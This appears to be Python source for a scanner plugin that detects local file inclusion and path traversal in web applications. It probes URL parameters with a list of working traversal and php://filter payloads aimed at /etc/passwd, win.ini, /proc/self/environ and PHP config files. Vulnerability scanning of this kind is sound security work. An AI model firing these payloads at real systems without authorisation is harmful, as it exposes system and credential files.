"""Local File Inclusion (LFI) / path traversal detection.

Checks for:
1. Classic path traversal (../../etc/passwd, ..\\..\\windows\\win.ini)
2. PHP wrapper abuse (php://filter, php://input, expect://)
3. Null byte injection (%00) for older PHP
4. Double encoding (%252e%252e%252f)
5. OS-specific file targets (Linux /etc/passwd, Windows win.ini)
6. PayloadEngine integration for extended payloads
"""

from __future__ import annotations

import re
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# (payload, expected marker in response, label)
LFI_PAYLOADS: list[tuple[str, str, str]] = [
    # Classic traversal — Linux
    ("../../../../etc/passwd", "root:", "traversal_basic"),
    ("../../../../../../etc/passwd", "root:", "traversal_deep"),
    ("....//....//....//....//etc/passwd", "root:", "double_slash_bypass"),
    ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:", "url_encoded"),
    ("%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:", "full_encode"),
    ("..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", "root:", "double_encode"),
    ("....\\....\\....\\....\\etc\\passwd", "root:", "backslash_linux"),
    ("/etc/passwd", "root:", "absolute_path"),
    # Classic traversal — Windows
    ("..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]", "traversal_win"),
    ("..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "encoded_backslash"),
    ("../../../../../../windows/win.ini", "[fonts]", "forward_slash_win"),
    ("..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini", "[fonts]", "double_enc_win"),
    # Null byte (PHP < 5.3.4)
    ("../../../../../../etc/passwd%00", "root:", "null_byte"),
    ("../../../../../../etc/passwd%00.html", "root:", "null_byte_ext"),
    ("../../../../../../etc/passwd%00.jpg", "root:", "null_byte_img"),
    ("../../../../../../etc/passwd%00.pdf", "root:", "null_byte_pdf"),
    # PHP wrappers
    (
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "cm9vd",  # base64 of "root:"
        "php_filter_b64",
    ),
    (
        "php://filter/convert.base64-encode/resource=index.php",
        "PD9waH",  # base64 of "<?ph"
        "php_filter_source",
    ),
    (
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "ebbg:",  # rot13 of "root:"
        "php_filter_rot13",
    ),
    (
        "php://filter/convert.base64-encode/resource=../config.php",
        "PD9waH",
        "php_filter_config",
    ),
    # /proc/self (Linux info disclosure)
    ("/proc/self/environ", "PATH=", "proc_environ"),
    ("/proc/self/cmdline", "/usr/", "proc_cmdline"),
    ("../../../../../../proc/self/environ", "PATH=", "proc_environ_trav"),
    # Common config files
    ("../../../../../../etc/hosts", "localhost", "etc_hosts"),
    # Tomcat / Java
    ("WEB-INF/web.xml", "<web-app", "web_inf_xml"),
    ("../../../../../../etc/tomcat/server.xml", "<Server", "tomcat_conf"),
]

# Parameters commonly vulnerable to LFI
LFI_PARAMS = [
    "file", "path", "page", "include", "template", "doc",
    "folder", "dir", "document", "root", "pg", "style",
    "pdf", "img", "filename", "lang", "language", "locale",
    "view", "content", "layout", "mod", "conf", "type",
]

# Scan paths where LFI params might exist
SCAN_PATHS = [
    "/", "/index.php", "/page.php", "/view.php",
    "/download.php", "/file.php", "/read.php", "/show.php",
]


class LfiCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="lfi_check",
        display_name="LFI / Path Traversal",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects Local File Inclusion and path traversal via "
            "classic traversal, PHP wrappers, null byte, double encoding"
        ),
        produces=["lfi_findings"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"lfi_tests": []},
            )

        # Extend payloads from PayloadEngine
        payloads = list(LFI_PAYLOADS)
        if hasattr(ctx, "payloads") and ctx.payloads:
            try:
                engine_payloads = ctx.payloads.get("lfi")
                for ep in engine_payloads[:20]:
                    p_str = ep if isinstance(ep, str) else ep[0]
                    if not any(p_str == existing[0] for existing in payloads):
                        marker = "root:"
                        if "win.ini" in p_str:
                            marker = "[fonts]"
                        elif "php://" in p_str and "base64" in p_str:
                            marker = "cm9vd"
                        payloads.append((p_str, marker, "engine"))
            except Exception:
                pass

        # Collect extra paths from pipeline
        extra_paths = ctx.state.get("discovered_api_paths", {}).get(target.host, [])
        scan_paths = list(SCAN_PATHS)
        for p in extra_paths[:5]:
            if p not in scan_paths:
                scan_paths.append(p)

        for path in scan_paths:
            if ctx.should_stop or len(findings) >= 5:
                break

            for param in LFI_PARAMS:
                if ctx.should_stop or len(findings) >= 5:
                    break

                # Baseline: normal value
                baseline_body = ""
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(
                            f"{base_url}{path}?{param}=test", timeout=5.0,
                        )
                        baseline_body = await resp.text(
                            encoding="utf-8", errors="replace",
                        )
                except Exception:
                    continue

                if not baseline_body:
                    continue

                for payload, marker, label in payloads:
                    if ctx.should_stop or len(findings) >= 5:
                        break

                    url = f"{base_url}{path}?{param}={quote(payload, safe='/:')}"
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=8.0)
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                    except Exception:
                        continue

                    # Check marker present in response but not baseline
                    if marker not in body or marker in baseline_body:
                        continue

                    # Structural verification for /etc/passwd
                    if marker == "root:" and not re.search(
                        r"\w+:[^:]*:\d+:\d+:", body,
                    ):
                        continue

                    if True:
                        severity = Finding.critical
                        desc = "Path traversal confirmed"

                        if "php://" in payload:
                            severity = Finding.high
                            desc = "PHP wrapper LFI (source disclosure)"
                        elif "proc/self" in payload:
                            severity = Finding.high
                            desc = "LFI: /proc/self access"
                        elif "WEB-INF" in payload:
                            severity = Finding.high
                            desc = "Java WEB-INF exposure"

                        tested.append({
                            "path": path, "param": param,
                            "payload": payload, "label": label,
                        })
                        findings.append(severity(
                            f"{desc}: {path}?{param}= ({label})",
                            description=(
                                f"LFI via {label}. "
                                f"File content marker '{marker}' found."
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Marker: '{marker}' in response"
                            ),
                            remediation=(
                                "Never use user input in file paths. "
                                "Use a whitelist of allowed files. "
                                "Disable allow_url_include in PHP."
                            ),
                            tags=["pentesting", "lfi", label],
                        ))
                        break  # One per param

        if not findings:
            findings.append(Finding.info(
                "No LFI/path traversal vulnerabilities detected",
                tags=["pentesting", "lfi"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"lfi_tests": tested},
        )
